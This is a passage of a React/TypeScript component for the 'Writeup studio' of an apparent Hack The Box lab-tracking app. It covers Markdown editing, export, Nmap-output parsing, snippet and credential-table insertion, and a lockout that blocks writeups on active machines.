    () => (selectedMachine && !selectedMachine.isActive ? getBacklinks(backlinkDocs, selectedMachine.name) : []),
    [backlinkDocs, selectedMachine?.name, selectedMachine?.isActive]
  );

  const handleResetToTemplate = async () => {
    if (!selectedMachine) return;
    const ok = await confirmAction({
      title: `Reset writeup for ${selectedMachine.name}?`,
      body: 'This replaces the current writeup with the standard template. Unsaved edits will be lost.',
      confirmLabel: 'Reset',
      tone: 'danger',
    });
    if (ok) {
      const tmpl = generateTemplate(selectedMachine);
      setEditorContent(tmpl);
      updateMachine(selectedMachine.id, { writeupMarkdown: tmpl });
      if (soundEnabled) playCyberSound('root');
    }
  };

  const handleCopyMarkdown = async () => {
    const inlined = await inlineIndexedDbImages(editorContent, profileId);
    navigator.clipboard.writeText(inlined);
    setCopied(true);
    if (soundEnabled) playCyberSound('copy');
    setTimeout(() => setCopied(false), 2000);
  };

  const handleDownloadMarkdown = async () => {
    if (!selectedMachine) return;
    const inlined = await inlineIndexedDbImages(editorContent, profileId);
    const blob = new Blob([inlined], { type: 'text/markdown;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    const rawSlug = (selectedMachine.name || 'writeup').toLowerCase().replace(/[^a-z0-9]/g, '-');
    const safeSlug = sanitizeFilename(rawSlug, 'writeup');
    link.download = `${safeSlug}-writeup.md`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
    if (soundEnabled) playCyberSound('root');
  };

  const handleDownloadHtml = async () => {
    if (!selectedMachine) return;
    const inlined = await inlineIndexedDbImages(editorContent, profileId);
    const activeBrandObj = BRAND_THEMES.find((b) => b.id === appBrand) || BRAND_THEMES[0];
    downloadWriteupHtml(selectedMachine, inlined, {
      brandName: `${activeBrandObj.namePrefix}${activeBrandObj.nameSuffix}`,
    });
    if (soundEnabled) playCyberSound('export');
  };

  const overflowItems: OverflowItem[] = [
    ...(hasUserNotes
      ? [
          {
            id: 'field-manual',
            label: cptsDrawerOpen ? 'Hide your notes' : `Your notes (${matchingNotes.length})`,
            icon: <BookOpen className="w-3.5 h-3.5" />,
            onSelect: () => setCptsDrawerOpen((prev) => !prev),
          },
        ]
      : []),
    ...(labSummary
      ? [
          {
            id: 'lab-summary',
            label: 'Insert lab summary',
            icon: <ListChecks className="w-3.5 h-3.5" />,
            onSelect: () => handleInsertLabSummary(),
          },
        ]
      : []),
    {
      id: 'executive-report',
      label: 'Executive report',
      icon: <Printer className="w-3.5 h-3.5" />,
      onSelect: () => setReportModalOpen(true),
    },
    {
      id: 'copy-raw',
      label: 'Copy raw Markdown',
      icon: <Copy className="w-3.5 h-3.5" />,
      onSelect: handleCopyMarkdown,
    },
    {
      id: 'export-md',
      label: 'Export .md',
      icon: <Download className="w-3.5 h-3.5" />,
      onSelect: handleDownloadMarkdown,
    },
    {
      id: 'reset-template',
      label: 'Reset to template',
      icon: <RotateCcw className="w-3.5 h-3.5" />,
      onSelect: handleResetToTemplate,
      danger: true,
    },
  ];

  const toolbarBtn =
    'flex items-center gap-1.5 px-3 h-8 rounded-lg bg-surface-card border border-subtle hover:border-strong text-secondary hover:text-primary text-xs font-medium transition-[transform,background-color,border-color,color] cursor-pointer active:scale-[0.97]';

  const miniToolBtn =
    'inline-flex items-center gap-1 px-1.5 py-1 rounded hover:bg-surface-hover text-secondary hover:text-primary text-[11px] font-medium transition-colors cursor-pointer active:scale-[0.97]';

  const userPwned = Boolean(selectedMachine?.userPwnedAt);
  const rootPwned = Boolean(selectedMachine?.rootPwnedAt);

  return (
    <div className="space-y-3 w-full font-sans">
      <PageHeader
        title="Writeup studio"
        description="Write in Markdown with a live preview. Exports to Obsidian and GitBook."
        icon={<FileText />}
        primaryAction={
          selectedMachine?.isActive ? undefined : (
            <CyberButton
              variant="primary"
              size="md"
              className="max-sm:h-11 max-sm:flex-1"
              onClick={handleDownloadHtml}
              data-tour="writeup-export"
              title="Export a self-contained HTML writeup with one-click Print to PDF"
              iconLeft={<Globe className="w-3.5 h-3.5" />}
            >
              Export HTML
            </CyberButton>
          )
        }
        actions={
          selectedMachine?.isActive ? null : (
            <>
              <button
                type="button"
                onClick={handleCopyMarkdown}
                className={toolbarBtn}
              >
                {copied ? (
                  <>
                    <Check className="w-3.5 h-3.5 text-callout-success-fg" />
                    <span className="text-callout-success-fg">Copied</span>
                  </>
                ) : (
                  <>
                    <Copy className="w-3.5 h-3.5" />
                    <span>Copy raw</span>
                  </>
                )}
              </button>
              {hasUserNotes && (
                <button
                  type="button"
                  onClick={() => setCptsDrawerOpen((prev) => !prev)}
                  aria-pressed={cptsDrawerOpen}
                  className={`${toolbarBtn} ${cptsDrawerOpen ? 'border-accent text-primary' : ''}`}
                  title="Toggle the quick reference from your notes"
                >
                  <BookOpen className="w-3.5 h-3.5" />
                  <span>Your notes (<span className="tabular-nums">{matchingNotes.length}</span>)</span>
                </button>
              )}
              <button
                type="button"
                onClick={() => handleInsertLabSummary()}
                disabled={!labSummary}
                className={`${toolbarBtn} disabled:opacity-50 disabled:cursor-not-allowed`}
                title={
                  labSummary
                    ? 'Insert ports, triage notes, findings and timeline at the cursor'
                    : 'No ports, triage notes, findings or timeline recorded for this lab yet'
                }
              >
                <ListChecks className="w-3.5 h-3.5" />
                <span>Insert lab summary</span>
              </button>
              <button
                type="button"
                onClick={() => setReportModalOpen(true)}
                className={toolbarBtn}
                title="Generate a print-ready executive penetration testing report"
              >
                <Printer className="w-3.5 h-3.5" />
                <span>Executive report</span>
              </button>
              <button
                type="button"
                onClick={handleDownloadMarkdown}
                className={toolbarBtn}
                title="Export raw Markdown (.md) for Obsidian or GitBook"
              >
                <Download className="w-3.5 h-3.5" />
                <span>Export .md</span>
              </button>
            </>
          )
        }
        overflow={selectedMachine?.isActive ? [] : overflowItems}
      >
        {/* Machine selector + Target Intelligence & Writeup Readiness Bar */}
        <div className="flex flex-wrap items-center justify-between gap-2.5 w-full">
          <div className="flex flex-wrap items-center gap-2">
            <div data-tour="writeup-target" className="flex items-center gap-1.5 bg-surface-sunken px-2.5 py-1 max-sm:py-2 rounded-lg border border-subtle max-sm:w-full">
              <span className="text-xs font-medium text-muted flex-shrink-0">Target</span>
              <CyberSelect
                value={selectedMachine?.id || ''}
                onChange={(v) => {
                  setWriteupMachineId(v);
                  navigate(`/writeup/${encodeURIComponent(v)}`);
                }}
                options={retiredMachines.map((m) => ({
                  value: m.id,
                  label: `${m.name} (${m.platform})`,
                  icon: <PlatformIcon platform={m.platform} className="w-3.5 h-3.5" />,
                  description: `${m.ip} · ${m.difficulty}`,
                }))}
                searchable
                searchPlaceholder="Search box by name, IP..."
                variant="transparent"
                size="xs"
                triggerClassName="py-0 px-1 border-none bg-transparent hover:bg-transparent max-w-[210px] max-sm:max-w-none"
                soundEnabled={soundEnabled}
              />
            </div>

            {selectedMachine && !selectedMachine.isActive && (
              <div className="flex flex-wrap items-center gap-1.5 text-[11px]">
                <span className="px-2 py-1 rounded-md border border-subtle bg-surface-sunken font-mono text-secondary">
                  {selectedMachine.ip || '10.10.x.x'}
                </span>
                <span className="px-2 py-1 rounded-md border border-subtle bg-surface-sunken text-secondary">
                  {selectedMachine.os} · {selectedMachine.difficulty}
                </span>
                <button
                  type="button"
                  onClick={() => toggleUserFlag(selectedMachine.id)}
                  className={`inline-flex items-center gap-1 px-2 py-1 rounded-md border font-mono text-[10px] font-semibold cursor-pointer transition-colors ${
                    userPwned
                      ? 'border-callout-success-border bg-callout-success-bg text-callout-success-fg'
                      : 'border-subtle bg-surface-sunken text-muted hover:text-primary'
                  }`}
                  title="Toggle user.txt flag"
                >
                  <Flag className="w-2.5 h-2.5" />
                  <span>user.txt</span>
                  {userPwned && <Check className="w-2.5 h-2.5" />}
                </button>
                <button
                  type="button"
                  onClick={() => toggleRootFlag(selectedMachine.id)}
                  className={`inline-flex items-center gap-1 px-2 py-1 rounded-md border font-mono text-[10px] font-semibold cursor-pointer transition-colors ${
                    rootPwned
                      ? 'border-callout-danger-border bg-callout-danger-bg text-callout-danger-fg'
                      : 'border-subtle bg-surface-sunken text-muted hover:text-primary'
                  }`}
                  title="Toggle root.txt flag"
                >
                  <Crown className="w-2.5 h-2.5" />
                  <span>root.txt</span>
                  {rootPwned && <Check className="w-2.5 h-2.5" />}
                </button>
              </div>
            )}
          </div>

          {/* Writeup Readiness Meter & Layout Mode Switcher */}
          {selectedMachine && !selectedMachine.isActive && (
            <div data-testid="writeup-readiness-bar" className="flex flex-wrap items-center gap-2 ml-auto">
              <div className="hidden md:flex items-center gap-1.5 px-2.5 py-1 rounded-lg border border-subtle bg-surface-sunken text-[10px]">
                <span className="font-semibold text-muted uppercase tracking-wider">Readiness</span>
                <span className={`font-mono font-bold ${readiness.score >= 80 ? 'text-callout-success-fg' : readiness.score >= 40 ? 'text-callout-warn-fg' : 'text-accent'}`}>
                  {readiness.score}%
                </span>
                <div className="flex items-center gap-1 ml-1">
                  {readiness.checks.map((c) => (
                    <span
                      key={c.id}
                      className={`px-1.5 py-0.5 rounded border text-[9px] font-medium ${
                        c.ok
                          ? 'border-callout-success-border bg-callout-success-bg text-callout-success-fg'
                          : 'border-subtle bg-surface-card text-muted'
                      }`}
                    >
                      {c.ok ? '✓ ' : ''}{c.label}
                    </span>
                  ))}
                </div>
              </div>

              <div className="inline-flex items-center rounded-lg border border-subtle bg-surface-sunken p-0.5 text-[11px]">
                <button
                  type="button"
                  onClick={() => setStudioLayout('split')}
                  className={`px-2 py-0.5 rounded-md font-medium cursor-pointer transition-colors ${
                    studioLayout === 'split' ? 'bg-accent-muted text-accent' : 'text-muted hover:text-primary'
                  }`}
                >
                  Split
                </button>
                <button
                  type="button"
                  onClick={() => setStudioLayout('editor')}
                  className={`px-2 py-0.5 rounded-md font-medium cursor-pointer transition-colors ${
                    studioLayout === 'editor' ? 'bg-accent-muted text-accent' : 'text-muted hover:text-primary'
                  }`}
                >
                  Editor
                </button>
                <button
                  type="button"
                  onClick={() => setStudioLayout('preview')}
                  className={`px-2 py-0.5 rounded-md font-medium cursor-pointer transition-colors ${
                    studioLayout === 'preview' ? 'bg-accent-muted text-accent' : 'text-muted hover:text-primary'
                  }`}
                >
                  Preview
                </button>
              </div>
            </div>
          )}
        </div>
      </PageHeader>

      {/* Field Manual Quick Reference Drawer */}
      <AnimatePresence initial={false}>
      {cptsDrawerOpen && hasUserNotes && (
        <motion.div
          key="cpts-drawer"
          initial={{ opacity: 0, y: -8 }}
          animate={{ opacity: 1, y: 0, transition: TACTICAL_SPRING }}
          exit={{ opacity: 0, y: -8, transition: { duration: 0.14, ease: 'easeOut' } }}
          className="p-4 rounded-xl border border-subtle bg-surface-elevated machined-edge-subtle space-y-3 font-sans">
          <div className="flex items-center justify-between border-b border-subtle pb-2.5">
            <div className="flex items-center gap-2">
              <BookOpen className="w-4 h-4 text-muted" />
              <span className="font-semibold text-primary text-xs">
                Quick reference from your notes
              </span>
              <span className="text-xs px-2 py-0.5 rounded bg-surface-sunken text-muted border border-subtle font-mono tabular-nums">
                {matchingNotes.length} matches (max 20)
              </span>
            </div>

            <button aria-label="Close quick reference"
              type="button"
              onClick={() => setCptsDrawerOpen(false)}
              className="p-1 max-sm:p-3 rounded text-muted hover:text-primary cursor-pointer active:scale-[0.97]"
            >
              <X className="w-4 h-4" />
            </button>
          </div>

          <div className="relative">
            <Search className="w-3.5 h-3.5 text-muted absolute left-3 top-2.5" />
            <input
              type="text"
              id="writeup-notes-search"
              name="writeup-notes-search"
              aria-label="Search your notes and commands"
              value={cptsSearch}
              onChange={(e) => setCptsSearch(e.target.value)}
              placeholder="Search notes and commands (kerberoast, suid, lfi, bloodhound)..."
              className="w-full bg-surface-sunken border border-strong rounded-lg pl-8 pr-3 py-1.5 text-xs text-primary placeholder:text-muted focus:outline-none focus:border-accent"
            />
          </div>

          <div tabIndex={0} role="region" aria-label="Matching notes" className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3 max-h-72 overflow-y-auto pr-1">
            {matchingNotes.length === 0 ? (
              <div className="col-span-full p-4 text-center text-xs text-muted">
                No matching notes found.
              </div>
            ) : (
              matchingNotes.map((note) => (
                <div
                  key={note.id}
                  className="p-3 rounded-lg bg-surface-sunken border border-subtle hover:border-strong transition-colors space-y-2 flex flex-col justify-between"
                >
                  <div className="space-y-1">
                    <div className="flex items-center justify-between gap-1">
                      <span className="font-semibold text-primary text-xs truncate" title={note.title}>
                        {note.title}
                      </span>
                      <span className="text-[11px] px-1.5 py-0.5 rounded bg-surface-card text-muted border border-subtle flex-shrink-0">
                        {note.difficulty}
                      </span>
                    </div>
                    <div className="text-[11px] text-muted line-clamp-2">
                      {note.summary || note.subCategory}
                    </div>
                  </div>

                  {note.commands && note.commands.length > 0 && (
                    <div className="p-1.5 rounded bg-surface-inverse border border-inverse font-mono text-[11px] text-on-inverse truncate">
                      {interpolateCommand(note.commands[0], { ...globalVars, targetIp: selectedMachine?.ip || '' })}
                    </div>
                  )}

                  <div className="flex items-center justify-between gap-2 pt-1 border-t border-subtle">
                    <span className="text-[11px] text-muted truncate">
                      {note.category}
                    </span>
                    <button
                      type="button"
                      onClick={() => handleInsertNote(note)}
                      className="flex items-center gap-1 px-2.5 py-1 max-sm:py-2.5 rounded bg-surface-card hover:bg-surface-hover border border-subtle text-secondary hover:text-primary text-xs font-medium transition-colors cursor-pointer active:scale-[0.97]"
                      title="Insert this note and commands into active writeup"
                    >
                      <Plus className="w-3 h-3" />
                      <span>Insert</span>
                    </button>
                  </div>
                </div>
              ))
            )}
          </div>
        </motion.div>
      )}
      </AnimatePresence>

      {/* Dual-Pane Editor Workspace or HTB ToS Active Target Lockout */}
      {selectedMachine?.isActive ? (
        <div className="rounded-2xl border border-subtle bg-surface-card p-8 sm:p-12 text-center space-y-4 max-w-2xl mx-auto my-8">
          <div className="w-12 h-12 rounded-xl bg-callout-warn-bg border border-callout-warn-border flex items-center justify-center text-callout-warn-fg mx-auto">
            <Lock className="w-6 h-6" />
          </div>
          <h3 className="text-lg font-semibold text-primary">Writeups Prohibited for Active Targets</h3>
          <p className="text-xs text-secondary max-w-md mx-auto leading-relaxed">
            Under Hack The Box Terms of Service (AUP §8.2) and Community Rules, authoring or publishing writeups, walkthroughs, attack vectors, or solutions for active seasonal machines is strictly prohibited. Full Writeup Studio documentation will unlock automatically once this machine is retired.
          </p>
        </div>
      ) : (
        <>
          <div className={`grid grid-cols-1 ${studioLayout === 'split' ? 'lg:grid-cols-2' : 'lg:grid-cols-1'} gap-4 items-stretch lg:min-h-[calc(100vh-250px)]`}>
            
            {/* Left Pane: Raw Markdown Editor + Tactical Authoring Toolbar */}
            {studioLayout !== 'preview' && (
              <div data-tour="writeup-editor" className="flex flex-col rounded-xl border border-subtle bg-surface-card machined-edge-subtle overflow-hidden" style={{ contain: 'content' }}>
                <div className="flex items-center justify-between border-b border-subtle px-4 py-2 bg-surface-sunken text-xs">
                  <span className="font-semibold text-primary flex items-center gap-2">
                    <Code className="w-4 h-4 text-accent" /> Markdown
                  </span>
                  <span className="text-[11px] text-muted font-mono tabular-nums">
                    {telemetry.chars} chars · {telemetry.words} words · {telemetry.lines} lines
                  </span>
                </div>

                {/* Tactical Writeup Authoring Toolbar */}
                <div
                  data-testid="writeup-editor-toolbar"
                  className="flex flex-wrap items-center gap-1 px-2.5 py-1.5 bg-surface-sunken/70 border-b border-subtle text-[11px]"
                >
                  <button type="button" onClick={() => insertAtCursor('\n## Section Heading\n')} className={miniToolBtn} title="Insert H2 Heading">
                    <Heading2 className="w-3.5 h-3.5" />
                  </button>
                  <button type="button" onClick={() => insertAtCursor('\n### Subheading\n')} className={miniToolBtn} title="Insert H3 Heading">
                    <Heading3 className="w-3.5 h-3.5" />
                  </button>
                  <button type="button" onClick={() => insertAtCursor('**bold**')} className={miniToolBtn} title="Bold">
                    <Bold className="w-3.5 h-3.5" />
                  </button>
                  <button type="button" onClick={() => insertAtCursor('\n```bash\n# Command\n```\n')} className={miniToolBtn} title="Insert Bash Code Block">
                    <Terminal className="w-3.5 h-3.5 text-accent" />
                    <span>Bash</span>
                  </button>
                  <button type="button" onClick={() => insertAtCursor('\n| Port | Service | Version | Notes |\n| :--- | :--- | :--- | :--- |\n| 80/tcp | http | Apache | Enumerate |\n')} className={miniToolBtn} title="Insert Markdown Table">
                    <Table className="w-3.5 h-3.5" />
                  </button>
                  <button type="button" onClick={() => insertAtCursor('\n- [ ] Task item\n')} className={miniToolBtn} title="Insert Checklist">
                    <CheckSquare className="w-3.5 h-3.5" />
                  </button>
                  <button type="button" onClick={() => insertAtCursor('\n> [!NOTE] Tactical Observation\n> Detail critical finding here\n')} className={miniToolBtn} title="Insert Obsidian Callout">
                    <AlertTriangle className="w-3.5 h-3.5 text-callout-warn-fg" />
                    <span>Callout</span>
                  </button>

                  <div className="w-px h-3.5 bg-subtle mx-0.5" />

                  {/* Upload Screenshot Button */}
                  <input
                    ref={fileInputRef}
                    type="file"
                    accept="image/*"
                    onChange={handleImageFileUpload}
                    className="hidden"
                  />
                  <button
                    type="button"
                    onClick={() => fileInputRef.current?.click()}
                    data-testid="upload-screenshot-btn"
                    className={miniToolBtn}
                    title="Upload & compress screenshot (or Ctrl+V paste in editor)"
                  >
                    <ImageIcon className="w-3.5 h-3.5 text-accent" />
                    <span>Screenshot</span>
                  </button>

                  {/* Pull Field Log from Notes Workspace */}
                  <button
                    type="button"
                    onClick={handlePullFieldLog}
                    data-testid="pull-field-log-btn"
                    className="inline-flex items-center gap-1 px-2 py-1 rounded border border-accent/40 bg-accent-muted text-accent text-[10px] font-semibold hover:bg-surface-hover cursor-pointer"
                    title="Import Field Log note & Quick Notes for this target"
                  >
                    <BookOpen className="w-3 h-3" />
                    <span>Pull Field Log</span>
                  </button>

                  {/* Insert Vault Loot Table */}
                  <button
                    type="button"
                    onClick={handleInsertVaultLoot}
                    data-testid="insert-vault-loot-btn"
                    className="inline-flex items-center gap-1 px-2 py-1 rounded border border-callout-warn-border bg-callout-warn-bg text-callout-warn-fg text-[10px] font-semibold hover:bg-surface-hover cursor-pointer"
                    title="Insert captured credentials from Vault as a Markdown table"
                  >
                    <KeyRound className="w-3 h-3" />
                    <span>Vault Loot</span>
                  </button>

                  {/* Parse Nmap Popover */}
                  <div className="relative">
                    <button
                      type="button"
                      onClick={() => setNmapPopoverOpen((p) => !p)}
                      data-testid="writeup-nmap-btn"
                      className="inline-flex items-center gap-1 px-2 py-1 rounded border border-callout-success-border bg-callout-success-bg text-callout-success-fg text-[10px] font-semibold hover:bg-surface-hover cursor-pointer"
                      title="Paste raw Nmap output and convert to Markdown table"
                    >
                      <Radar className="w-3 h-3" />
                      <span>Parse Nmap</span>
                    </button>
                    {nmapPopoverOpen && (
                      <div className="absolute left-0 top-full mt-1 w-72 p-2.5 rounded-lg bg-surface-card border border-strong shadow-2xl z-50 space-y-2">
                        <div className="flex items-center justify-between">
                          <span className="text-[10px] font-semibold text-callout-success-fg uppercase">Paste Raw Nmap</span>
                          <button type="button" onClick={() => setNmapPopoverOpen(false)} className="text-muted hover:text-primary cursor-pointer">
                            <X className="w-3 h-3" />
                          </button>
                        </div>
                        <textarea
                          value={rawNmapText}
                          onChange={(e) => setRawNmapText(e.target.value)}
                          placeholder={"22/tcp open ssh OpenSSH 8.9\n80/tcp open http Apache 2.4"}
                          rows={4}
                          className="w-full p-2 rounded border border-subtle bg-surface-sunken font-mono text-[10px] text-primary"
                        />
                        <button
                          type="button"
                          disabled={!rawNmapText.trim()}
                          onClick={() => {
                            const rows: string[] = [];
                            for (const line of rawNmapText.split(/\r?\n/)) {
                              const m = line.trim().match(/^(\d+)\/(tcp|udp)\s+(open|filtered)\s+(\S+)(?:\s+(.*))?$/i);
                              if (m) {
                                rows.push(`| ${m[1]}/${m[2]} | ${m[4]} | ${(m[5] || '-').trim()} | Enumerate banner & CVEs |`);
                              }
                            }
                            if (rows.length > 0) {
                              insertAtCursor(`\n### Nmap Scan Results\n| Port | Service | Version | Notes |\n| :--- | :--- | :--- | :--- |\n${rows.join('\n')}\n`);
                              setRawNmapText('');
                              setNmapPopoverOpen(false);
                              useToastStore.getState().addToast({ type: 'success', message: `Inserted ${rows.length} ports into writeup` });
                            }
                          }}
                          className="w-full h-7 rounded bg-callout-success-bg border border-callout-success-border text-callout-success-fg font-semibold text-[11px] cursor-pointer disabled:opacity-40"
                        >
                          Convert & Insert
                        </button>
                      </div>
                    )}
                  </div>

                  {/* Quick Cheatsheet Snippets Popover */}
                  <div className="relative">
                    <button
                      type="button"
                      onClick={() => setSnippetPopoverOpen((p) => !p)}
                      data-testid="writeup-snippets-btn"
                      className="inline-flex items-center gap-1 px-2 py-1 rounded border border-subtle bg-surface-card text-secondary hover:text-primary text-[10px] font-semibold cursor-pointer"
                      title="Drop command from 85+ Cheatsheets"
                    >
                      <Sparkles className="w-3 h-3 text-accent" />
                      <span>Snippets</span>
                    </button>
                    {snippetPopoverOpen && (
                      <div className="absolute right-0 top-full mt-1 w-72 p-2 rounded-lg bg-surface-card border border-strong shadow-2xl z-50 space-y-1.5">
                        <input
                          type="text"
                          value={snippetQuery}
                          onChange={(e) => setSnippetQuery(e.target.value)}
                          placeholder="Search 85+ commands..."
                          autoFocus
                          className="w-full h-7 px-2 rounded border border-subtle bg-surface-sunken text-[11px] text-primary"
                        />
                        <div className="max-h-48 overflow-y-auto space-y-0.5">
                          {filteredSnippets.map((cmd) => (
                            <button
                              key={cmd.id}
                              type="button"
                              onClick={() => {
                                const resolved = interpolateCommand(cmd.commandTemplate, {
                                  ...globalVars,
                                  targetIp: selectedMachine?.ip || '',
                                });
                                insertAtCursor(`\n\`\`\`bash\n# ${cmd.title}\n${resolved}\n\`\`\`\n`);
                                setSnippetPopoverOpen(false);
                              }}
                              className="w-full px-2 py-1 rounded text-left hover:bg-surface-sunken flex flex-col cursor-pointer"
                            >
                              <span className="font-semibold text-accent text-[11px] truncate">{cmd.title}</span>
                              <code className="text-[10px] text-secondary font-mono truncate">{cmd.commandTemplate}</code>
                            </button>
                          ))}
                        </div>
                      </div>
                    )}
                  </div>
                </div>

                <textarea
                  ref={editorRef}
                  id="writeup-markdown-editor"
                  name="writeup-markdown-editor"
                  aria-label="Markdown report editor"
                  value={editorContent}
                  onChange={handleEditorChange}
                  onPaste={handlePaste}
                  onBlur={flushDebouncedSave}
                  placeholder="Write your penetration testing report or paste notes here..."
                  className="flex-1 w-full min-h-[320px] p-4 bg-transparent text-primary font-mono text-xs focus:outline-none resize-none leading-relaxed overflow-y-auto"
                  spellCheck={false}
                />
              </div>
            )}

            {/* Right Pane: Live Rendered Preview (with Tables, Callouts, Checklists & Copyable Code Blocks) */}
            {studioLayout !== 'editor' && (
              <DeferredMarkdownPreviewPane content={editorContent} />
            )}

          </div>

          {/* Entries (notes, writeups, lab notes) whose [[wikilinks]] point at this box */}
          <BacklinksPanel backlinks={backlinks} title={selectedMachine?.name ?? ''} />

          {/* Footer Telemetry Strip */}
          <div
            data-testid="writeup-telemetry"
            className="flex items-center justify-end gap-4 px-4 py-2 rounded-lg border border-subtle bg-surface-sunken text-[11px] text-muted font-mono tabular-nums"
          >
            <span data-testid="writeup-telemetry-chars">{telemetry.chars} chars</span>
            <span data-testid="writeup-telemetry-words">{telemetry.words} words</span>
            <span data-testid="writeup-telemetry-lines">{telemetry.lines} lines</span>
          </div>
        </>
      )}

      {/* Executive Pentest Report Modal */}
      <PentestReportModal
        machine={selectedMachine || machines[0] || null}
        isOpen={reportModalOpen}
        onClose={() => setReportModalOpen(false)}
        onInsertSummary={(markdown) => {
          handleInsertLabSummary(markdown);
          setReportModalOpen(false);
        }}
      />
    </div>
  );
};
